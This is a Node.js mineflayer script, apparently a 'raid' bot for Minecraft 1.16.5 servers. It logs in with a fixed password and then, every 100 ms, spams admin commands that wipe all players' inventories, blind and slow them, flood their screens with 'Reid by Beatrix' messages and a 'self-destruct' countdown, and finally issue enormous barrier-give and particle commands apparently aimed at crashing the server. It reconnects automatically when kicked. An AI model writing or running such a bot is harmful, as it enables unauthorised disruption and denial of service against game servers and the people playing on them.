const mineflayer = require('mineflayer')

const {host} = require('./config.json')
const {ip} = require('./config.json')

name = "Test"

time_destroy_server = 1000

function createBot () {
    const bot = mineflayer.createBot({
        host: host,
        port: ip,
        username: name,
        version: "1.16.5",
    })
    bot.on('spawn', () => {
        bot.chat("/register beatrix beatrix")
        bot.chat("/reg beatrix beatrix")
        bot.chat("/register beatrix")
        bot.chat("/reg beatrix")
        bot.chat("/login beatrix")
        console.log("Starting...")
        start()
    })
    bot.on('error', err => console.log(err))
    bot.on('kicked', (reason, loggedIn) => {
        console.log(reason, loggedIn)
    })
    function between(min, max) {
        return Math.floor(
            Math.random() * (max - min) + min
        )
    }
    bot.on('end', createBot)
    function start() {
        setInterval(() => {
            bot.chat("/gamerule commandBlockOutput false")
            bot.chat(`/scoreboard objectives add Beatrix dummy {"text":"Beatrix"}`)
            bot.chat("/scoreboard objectives setdisplay sidebar Beatrix")
            bot.chat(`/scoreboard players set @a Beatrix ${between(10000000, 99999999)}`)
            bot.chat(`/bossbar add 1234 {"text":"Beatrix"}`)
            bot.chat("/bossbar set minecraft:1234 color red")
            bot.chat("/bossbar set minecraft:1234 visible true")
            bot.chat(`/bossbar set minecraft:1234 value ${between(10, 100)}`)
            bot.chat("/bossbar set minecraft:1234 players @a")
            bot.chat(`/bossbar add 12345 {"text":"Beatrix"}`)
            bot.chat("/bossbar set minecraft:12345 color red")
            bot.chat("/bossbar set minecraft:12345 visible true")
            bot.chat(`/bossbar set minecraft:12345 value ${between(10, 100)}`)
            bot.chat("/bossbar set minecraft:12345 players @a")
            bot.chat(`/bossbar add 123456 {"text":"Beatrix"}`)
            bot.chat("/bossbar set minecraft:123456 color red")
            bot.chat("/bossbar set minecraft:123456 visible true")
            bot.chat(`/bossbar set minecraft:123456 value ${between(10, 100)}`)
            bot.chat("/bossbar set minecraft:123456 players @a")
            bot.chat(`/bossbar add 1234567 {"text":"Beatrix"}`)
            bot.chat("/bossbar set minecraft:1234567 color red")
            bot.chat("/bossbar set minecraft:1234567 visible true")
            bot.chat(`/bossbar set minecraft:1234567 value ${between(10, 100)}`)
            bot.chat("/bossbar set minecraft:1234567 players @a")
            bot.chat(`/tellraw @a {"text":"Reid by Beatrix","color":"red"}`)
            bot.chat(`/tellraw @a {"text":"Reid by Beatrix","color":"black"}`)
            bot.chat("/time set day")
            bot.chat("/time set night")
            bot.chat("/xp set @a 0 points")
            bot.chat(`/xp set @a ${between(1000000000, 9999999999)} levels`)
            bot.chat("/give @a minecraft:barrier 1536")
            bot.chat("/clear @a")
            bot.chat("/effect give @a minecraft:slowness 1 255")
            bot.chat("/effect give @a minecraft:blindness 1 255")
            bot.chat(`/bossbar add ${between(1000, 9999)} {"text":"Beatrix"}`)
            bot.chat(`/title @a actionbar ["Самоуничтожение через: ",{"text":"${time_destroy_server}","bold":true,"color":"red"}]`)
            bot.chat(`/title @a title {"text":"${between(100000000000000, 999999999999999)}","bold":true,"color":"red"}`)
            bot.chat(`/title @a subtitle {"text":"${between(100000000000000, 999999999999999)}","color":"red","italic":true}`)
            time_destroy_server--
            if (time_destroy_server < 0) {
                bot.chat("/give @a minecraft:barrier 999999999")
                bot.chat("/particle minecraft:barrier ~ ~ ~ ~ ~ ~ 1 999999999")
            }
        }, 100);
    }
}
createBot()